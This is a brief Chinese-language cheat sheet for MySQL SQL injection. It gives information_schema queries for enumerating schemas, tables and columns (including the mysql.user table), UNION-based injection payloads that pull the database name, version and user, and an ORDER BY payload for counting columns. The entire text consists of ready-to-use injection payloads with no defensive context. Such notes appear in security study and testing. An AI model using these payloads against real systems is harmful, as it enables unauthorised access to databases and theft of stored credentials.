## 	查表三部曲

### 		1. 查找库名

```mysql
select distinct table_schema from information_schema.tables;
select distinct table_schema from information_schema.columns;
```

### 		2. 查找表名

```mysql
select table_name from information_schema.tables where table_schema='mysql';
select distinct table_name from information_schema.columns where table_schema='mysql';
```

### 		3. 查找字段名

```mysql
select column_name from information_schema.columns where table_schema='mysql' and table_name='user';
```

## 	union 注入

```mysql
'' or 1=1 union select 1,2,3 from <schema>.<tables> where 1='1'
'' union select 1,database(),version(),user() --''
```

## 快速查找字段数

```mysql
'1' order by 15 #
```

